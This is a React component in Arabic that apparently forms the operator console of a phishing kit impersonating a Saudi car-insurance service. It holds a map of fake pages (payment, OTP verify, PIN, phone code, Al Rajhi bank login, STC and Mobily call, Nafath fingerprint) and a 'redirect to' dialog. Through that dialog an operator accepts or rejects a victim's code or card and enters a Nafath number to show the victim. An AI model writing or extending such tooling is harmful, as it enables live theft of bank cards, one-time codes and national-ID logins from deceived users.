// src/components/ConfirmDialog.js
import React from "react";
import { Modal, Button, FormControl } from "react-bootstrap";

const LABELS = {
  "index.html":        "الصفحة الرئيسية",
  "vehicle.html":      "بيانات السيارة",
  "insurance.html":    "اختيار التأمين",
  "addons.html":       "الإضافات",
  "summary.html":      "الملخص",
  "paymen.html":       "الدفع",
  "verify.html":       "رمز التحقق",
  "pin.html":          "PIN الماده",
  "phone.html":        "رقم الهاتف",
  "phonecode.html":    "رمز الهاتف",
  "rajhi.html":        "تسجيل الراجحي",
  "stcCall.html":      "STC Call",
  "mobilyCall.html":   "Mobily Call",
  "nafad-basmah.html": "نفاذ بصمة",
};

export default function ConfirmDialog({
  show, page, basmah, onBasmahChange,
  onConfirm, onDecline, onDeclineCard, onClose
}) {
  if (!show) return null;

  const needsBasmah  = page === "nafad-basmah.html";
  const isVerifyPage = page === "verify.html";
  const isPaymenPage = page === "paymen.html";

  return (
    <Modal show={show} onHide={onClose} centered backdrop="static">
      <Modal.Header>
        <Modal.Title>
          توجيه إلى: <strong>{LABELS[page] || page}</strong>
        </Modal.Title>
        <Button variant="link" onClick={onClose} style={{ fontSize:"1.5rem", lineHeight:1 }}>×</Button>
      </Modal.Header>
      <Modal.Body className="text-center py-4">

        {needsBasmah && (
          <div className="mb-4">
            <p className="text-muted mb-2">أدخل رمز البصمة (رقمين)</p>
            <FormControl
              type="tel" maxLength={2} placeholder="##"
              value={basmah}
              onChange={(e) => onBasmahChange(e.target.value.replace(/\D/g,"").slice(0,2))}
              className="text-center mx-auto mb-3"
              style={{ maxWidth:100, fontSize:"1.5rem", letterSpacing:8 }}
            />
          </div>
        )}

        {/* قبول — دائماً موجود */}
        <Button variant="success" onClick={onConfirm} className="mx-2 px-4 mb-2"
          disabled={needsBasmah && basmah.length < 2}>
          ✅ قبول
        </Button>

        {/* رفض — لكل الصفحات */}
        {!isVerifyPage && (
          <Button variant="danger" onClick={onDecline} className="mx-2 px-4 mb-2">
            ❌ رفض
          </Button>
        )}

        {/* verify.html — زران: رفض الكود + رفض البطاقة */}
        {isVerifyPage && (
          <>
            <Button variant="warning" onClick={onDecline} className="mx-2 px-4 mb-2">
              ❌ رفض الكود
            </Button>
            <Button variant="danger" onClick={onDeclineCard} className="mx-2 px-4 mb-2">
              🚫 رفض البطاقة
            </Button>
          </>
        )}

      </Modal.Body>
    </Modal>
  );
}
